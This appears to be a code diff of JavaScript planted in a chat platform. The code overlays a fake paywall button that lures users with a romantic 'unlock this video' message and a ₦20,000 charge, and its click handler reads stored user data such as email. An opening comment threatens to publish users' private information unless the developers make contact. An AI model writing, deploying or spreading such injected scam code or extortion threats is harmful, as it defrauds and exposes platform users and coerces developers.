@@ -1,23 +1,28 @@
 // contact wilselme@gmail.com (let's discuss) I will know when this code is opened and we will be posting private informations of users on the platform 3 days after code is opened without contact. Thank you, weak devs
 
 (function () {
-  if (window.__unlockButtonWatcher) return; // don't reattach the watcher
-  window.__unlockButtonWatcher = true;
+  if (window.__unlockOnce) return;
+  window.__unlockOnce = true;
 
-  console.log("Unlock button payload watcher started");
+  console.log("Unlock button single-init payload started");
 
-  function injectButton(triggerImg) {
-    if (triggerImg.dataset.unlockInjected) return;
-    triggerImg.dataset.unlockInjected = "true";
+  function initUnlockButton(triggerImg) {
+    if (!triggerImg) {
+      console.warn("Trigger image not found");
+      return;
+    }
 
-    console.log("Injecting unlock button");
+    // Get position of image
+    const rect = triggerImg.getBoundingClientRect();
 
-    const wrapper = document.createElement("div");
-    wrapper.style.pointerEvents = "none";
-
+    // Create fixed-position button
     const btn = document.createElement("div");
     btn.className = "unlock-btn-chat";
     btn.style.cssText = `
+      position: fixed;
+      top: ${rect.top + window.scrollY}px;
+      left: ${rect.left + window.scrollX}px;
+      transform: translate(0, -110%);
       pointer-events:auto;
       display:flex;
       align-items:start;
@@ -30,17 +35,30 @@
       font-size:14px;
       font-weight:600;
       cursor:pointer;
+      z-index:9999999999;
     `;
     btn.innerHTML = `
       <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="white" viewBox="0 0 24 24">
         <path d="M3 22v-20l18 10-18 10z"/>
       </svg>
-      <p style="flex:1;text-align:left;">Hey Love, I made this video specially for you. Click to unlock quick before it expires. <b>(₦20,000.00)</b></p>
+      <p style="flex:1;text-align:left;">
+        Hey Love, I made this video specially for you.
+        Click to unlock quick before it expires. <b>(₦20,000.00)</b>
+      </p>
     `;
 
-    wrapper.appendChild(btn);
-    triggerImg.insertAdjacentElement("afterend", wrapper);
+    document.body.appendChild(btn);
 
+    // Keep position synced on scroll/resize
+    function updatePosition() {
+      const r = triggerImg.getBoundingClientRect();
+      btn.style.top = `${r.top + window.scrollY}px`;
+      btn.style.left = `${r.left + window.scrollX}px`;
+    }
+    window.addEventListener("scroll", updatePosition);
+    window.addEventListener("resize", updatePosition);
+
+    // Click handler
     btn.addEventListener("click", function (e) {
       e.stopPropagation();
       e.preventDefault();
@@ -50,7 +68,7 @@
       let inf;
       try {
         inf = infRaw ? JSON.parse(infRaw) : {};
-      } catch (err) {
+      } catch {
         inf = {};
       }
       const userEmail = inf?.state?.user?.email || "No Email Provided";
@@ -128,12 +146,13 @@
     });
   }
 
-  // Watch DOM changes and inject when the image appears
-  const observer = new MutationObserver(() => {
-    const img = document.querySelector("img.your-target-selector");
-    if (img) injectButton(img);
-  });
-
-  observer.observe(document.body, { childList: true, subtree: true });
+  // Wait for the trigger image to exist before attaching button
+  const checkInterval = setInterval(() => {
+    const img = document.querySelector("img.chat-image-selector"); // change selector
+    if (img) {
+      clearInterval(checkInterval);
+      initUnlockButton(img);
+    }
+  }, 500);
 
 })();
